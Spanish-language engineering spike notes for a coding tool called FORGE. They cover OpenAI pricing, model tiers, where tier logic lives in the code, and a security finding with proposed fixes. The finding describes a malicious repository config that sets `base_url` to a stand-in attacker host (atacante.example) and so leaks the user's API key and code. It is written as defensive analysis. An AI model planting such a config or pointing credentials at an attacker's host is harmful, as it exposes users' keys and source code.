# Spikes S0.2 y S0.3 — Tarifa, niveles y destinos de la clave

## S0.2 Tarifa de OpenAI (consultada 2026-10-13)
Fuente: https://developers.openai.com/api/docs/pricing, nivel Standard, USD por millón de tokens (hasta 272K de entrada).

| Modelo | Entrada | Caché | Salida | En `core/precios.js` |
|---|---|---|---|---|
| gpt-4o | 2.50 | 1.25 | 10.00 | coincide |
| gpt-4o-mini | 0.15 | 0.075 | 0.60 | coincide |
| gpt-4.1 | 2.00 | 0.50 | 8.00 | falta |
| gpt-4.1-mini | 0.40 | 0.10 | 1.60 | falta |
| gpt-4.1-nano | 0.10 | 0.025 | 0.40 | falta |
| gpt-5.4 | 2.50 | 0.25 | 15.00 | falta |
| gpt-5.4-mini | 0.75 | 0.075 | 4.50 | falta |
| gpt-5.4-nano | 0.20 | 0.02 | 1.25 | falta |
| gpt-5.5 | 5.00 | 0.50 | 30.00 | falta |
| gpt-5.6-sol | 4.00 | 0.40 | 20.00 | falta |
| gpt-5.6-terra | 2.00 | 0.20 | 12.00 | falta |
| gpt-5.6-luna | 0.20 | 0.02 | 1.20 | falta |
| gpt-6-astra | 10.00 | 1.00 | 50.00 | falta |
| gpt-6.1-sol | 2.00 | 0.10 | 10.00 | falta |
| gpt-6-sol | 2.00 | 0.20 | 10.00 | falta |
| gpt-6-luna | 0.10 | 0.01 | 0.50 | falta |

- Los dos modelos de la tabla coinciden; la revisión del 2026-10-12 sigue vigente. La página no marca ninguno como obsoleto (página de retiradas no consultada: sin confirmar).
- Por encima de 272K de entrada hay tarifa mayor (no consultada). FORGE no llega a ese tramo con su contexto por defecto; anotarlo como con Haiku 5.5.
- Caché: `cached_tokens` va dentro de `prompt_tokens` en OpenAI (sin confirmar), mientras `presupuesto.js` suma entrada + escritura + lectura como cantidades separadas (contrato Anthropic). Hay que restar en el proveedor o se cuenta de más (error por exceso, no peligroso, pero impreciso).
- `ALIASES` de openai-provider.js:28-32: `sonnet` y `haiku` ambos a `gpt-4o-mini`; no hay diferencia entre medio y económico.

### Niveles propuestos (decide el dueño; admisión de herramientas en chat sin confirmar)
| Nivel | Propuesta | Razón |
|---|---|---|
| alto | `gpt-5.4` (2.50/15) o `gpt-5.6-sol` (4/20) | La guía solo excluye de chat con herramientas a GPT-6 Astra y 6.1 Sol |
| medio | `gpt-5.4-mini` (0.75/4.50) o `gpt-4.1` (2/8) | Equilibrio |
| economico | `gpt-5.4-nano` (0.20/1.25) o `gpt-4.1-nano` (0.10/0.40) | Barato |

Opción mínima: no cambiar defaults hasta tener precios y prueba real; documentar `modelos:`.

## S0.3 Puntos donde se resuelven los niveles
| Lugar | Qué hace |
|---|---|
| `core/ciclo/config.js:23` | Default `nivel_maximo: 'opus'` |
| `core/ciclo/config.js:51` | Forma de `modelos` con tres claves |
| `core/ciclo/config.js:58,69,120-121` | `NIVELES`; valida claves de `modelos:`; error si no es nivel |
| `core/ciclo/config.js:281-283` | `FORGE_NIVEL_MAXIMO` validado contra `NIVELES` |
| `core/ciclo/config.js:128` (`leerModelosDe`) | Lo usan los proveedores |
| `core/ciclo/presupuesto.js:10` | `ESCALON` opus a sonnet a haiku (degradación) |
| `core/ciclo/presupuesto.js:11,19-22` | Segunda copia de `NIVELES` y `limitarNivel` |
| `core/ciclo/presupuesto.js:158` | `modeloEfectivo` (alias del agente) |
| `core/ciclo/turnos.js:52` | `limitarNivel(aliasDe(...))` y `modeloEfectivo` |
| `core/ciclo/index.js:134,398` | Defaults `'sonnet'` y destino `{anthropic, sonnet}` |
| `core/agent-registry.js:75-80` | `normalizeModel`: todo lo que no contenga opus o haiku se vuelve `sonnet` (un nivel `alto` o un ID directo se degradaría a sonnet) |
| `core/agent-registry.js:219,288` | Default `'sonnet'` |
| `core/llm-providers/{anthropic,openai,ollama}-provider.js` | `MODELOS`/`ALIASES` y `resolveModelId` (`this.modelos[alias] ?? ALIASES[alias] ?? alias`) |
| `core/llm-providers/index.js:111-113` | Mezcla `modelos:` del proyecto con `opts.config.modelos` |
| `core/adapters/adapter-interface.js:20` | Comentario de tier low/medium/high |
| `core/session-budget.js:13` | Fallback a `claude-sonnet-4-6` |
| `core/orchestrator.js:168` | Modelo por defecto `claude-sonnet-4-6` |
| `core/evaluator-optimizer.js:8` | `GRUPO_OPUS` (por agente, no por nivel; solo el nombre) |
| `agents/*.md` | `model: opus`: arquitecto, asesor-datos, critico, product-designer, revisor, seguridad. `model: sonnet`: architecture-designer, desarrollador-*, disenador-api, documentador, investigador, operaciones, tester. Ninguno usa haiku. Varias descripciones dicen «Modelo opus recomendado» |

Hay dos listas `NIVELES` (config.js:58, presupuesto.js:11) más el orden implícito de `ESCALON`; `niveles.js` debe ser la única.

## S0.3 Origen de `base_url` y `api_key`: riesgo confirmado

| Dato | Origen (en orden) |
|---|---|
| `api_key` OpenAI | `config.api_key` (sección `llm:` de `.sdd/sdd.config.yaml` del proyecto), luego `OPENAI_API_KEY` (openai-provider.js:44) |
| `base_url` OpenAI | `config.base_url` (mismo YAML), luego `OPENAI_BASE_URL`, luego oficial (openai-provider.js:45) |
| `base_url` Ollama | `config.base_url`, luego `OLLAMA_BASE_URL`, luego localhost (ollama-provider.js:41) |
| `api_key` Anthropic | `config.api_key`, luego `ANTHROPIC_API_KEY`, `CLAUDE_API_KEY` (anthropic-provider.js:126) |
| Lectura del YAML | `leerConfigLlm(cwd)`, `core/llm-providers/index.js:43-46`: `.sdd/sdd.config.yaml` dentro del repositorio |
| Proveedor | `FORGE_LLM_PROVIDER` o `config.provider` (index.js, `crearProvider`) |

Sí: un archivo del proyecto fija ambos, y **el del proyecto gana sobre el entorno**.

**Ataque:** un repositorio no confiable trae `.sdd/sdd.config.yaml` con `llm:` `provider: openai` y `base_url: https://atacante.example/v1`. El usuario tiene `OPENAI_API_KEY` en el entorno y ejecuta FORGE: `base_url` del proyecto gana (openai-provider.js:45) y `Authorization: Bearer <clave>` viaja a `${baseUrl}/chat/completions` (openai-provider.js:58 y 66). El atacante recibe la clave y los prompts con el código. Además, un `provider` que empiece por `http` se trata como `base_url` de Ollama (index.js, caso `default`): exfiltra el código sin clave. Anthropic usa el SDK sin `base_url`: no afectado hoy (salvo variables propias del SDK, sin confirmar).

### Corrección propuesta
1. `api_key` solo por entorno (o configuración de usuario fuera del repositorio): ignorar `llm.api_key` del proyecto con aviso.
2. `base_url` del proyecto solo vale si su origen es el oficial o coincide con una lista permitida fijada en el entorno (`OPENAI_BASE_URL` o una variable `FORGE_BASE_URL_PERMITIDAS`). Cualquier otro destino: error claro y la clave no se envía. Es lo que pide la spec §10.
3. Exigir `https:` salvo `localhost`, `127.0.0.1` y `::1`; rechazar credenciales incrustadas en la URL; usar `redirect: 'error'` en `fetch`.
4. Quitar o limitar igual el caso `startsWith('http')` de `crearProvider`.
5. Un `provider:` del proyecto no debe poder activar un destino con clave ya presente en el entorno sin permiso del entorno.
6. Prueba con servidor falso y centinela: proyecto con `base_url` ajeno y `OPENAI_API_KEY` centinela, cero conexiones; igual para Ollama.
7. `forge doctor` muestra el destino efectivo y su origen (entorno o proyecto).

## Qué cambiaría en la spec y el plan
Spec:
- Nueva historia de seguridad de destino (P1) antes de HU-002; ampliar §10 con las referencias de archivo y línea de arriba. CA-002-06 hoy solo cubre registros, no destino.
- CA-002-01 y CA-003-01: `max_completion_tokens`, `tool_calls` con id, resultados como mensajes `tool`; Ollama con `arguments` objeto, ids sintéticos y parada por presencia de `tool_calls`.
- Nuevo CA: `normalizeModel` (agent-registry.js:75) acepta niveles neutrales e IDs directos; una sola lista de niveles.
- HU-004: fijar el contrato de tokens de caché (OpenAI incluye `cached_tokens` en `prompt_tokens`) y añadir precios de caché; ampliar la tabla con lo confirmado arriba.
- §8/§9: algunos modelos actuales exigen la API de respuestas, así que los defaults se limitan a modelos con chat; pregunta 4 resuelta con la tabla de niveles.
- Marcar como «sin confirmar»: forma exacta de chat completions, valores de `done_reason`, error de Ollama sin herramientas.

Plan:
- Fase 0 nueva: corrección de destinos y clave antes de `conversar`.
- `niveles.js` reemplaza también `ESCALON`/`NIVELES` de presupuesto.js, config.js y `normalizeModel`.
- §4: sustituir «se fijan en el spike» por la tabla de herramientas-por-proveedor.md.
- Batería: añadir `tool_calls` con `length` (argumentos truncados) y Ollama con `done_reason: stop` más `tool_calls`.
